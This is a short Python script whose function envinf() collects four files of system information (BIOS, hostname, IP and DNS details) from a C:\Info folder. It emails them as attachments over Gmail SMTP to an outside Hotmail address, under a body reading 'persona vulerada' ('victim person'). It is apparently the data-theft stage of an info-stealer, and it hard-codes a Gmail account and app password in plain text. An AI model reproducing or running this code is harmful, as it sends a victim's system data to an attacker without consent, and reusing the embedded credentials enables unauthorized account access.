import smtplib
from email.mime.text import MIMEText
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email import encoders
from email.mime.base import MIMEBase
def envinf():
    msg = MIMEMultipart()
    msg['Subject'] = 'Correo con informacion sistema'
    msg['From'] = 'jalcytestpias@gmail.com'
    msg['To'] = 'hass20102010@hotmail.com'

    text = MIMEText("persona vulerada")
    msg.attach(text)

    attachment1 = MIMEBase('application', 'octet-stream')
    attachment1.set_payload(open("c:\Info\sbios.txt", 'rb').read())
    encoders.encode_base64(attachment1)
    attachment1.add_header('Content-Disposition', 'attachment; filename="sbios.txt"')
    msg.attach(attachment1)
    
    attachment2 = MIMEBase('application', 'octet-stream')
    attachment2.set_payload(open("c:\Info\host.txt", 'rb').read())
    encoders.encode_base64(attachment2)
    attachment2.add_header('Content-Disposition', 'attachment; filename="host.txt"')
    msg.attach(attachment2)

    attachment3 = MIMEBase('application', 'octet-stream')
    attachment3.set_payload(open("c:\Info\ip.txt", 'rb').read())
    encoders.encode_base64(attachment3)
    attachment3.add_header('Content-Disposition', 'attachment; filename="ip.txt"')
    msg.attach(attachment3)

    attachment4 = MIMEBase('application', 'octet-stream')
    attachment4.set_payload(open("c:\Info\dns.txt", 'rb').read())
    encoders.encode_base64(attachment4)
    attachment4.add_header('Content-Disposition', 'attachment; filename="dns.txt"')
    msg.attach(attachment4)

    mailServer = smtplib.SMTP('smtp.gmail.com',587)
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login('jalcytestpias@gmail.com', 'eogomjrkwyrepfsx')
    mailServer.sendmail('jalcytestpias@gmail.com', 'hass20102010@hotmail.com', msg.as_string())
    mailServer.quit()

    print('Documento enviado con exito')
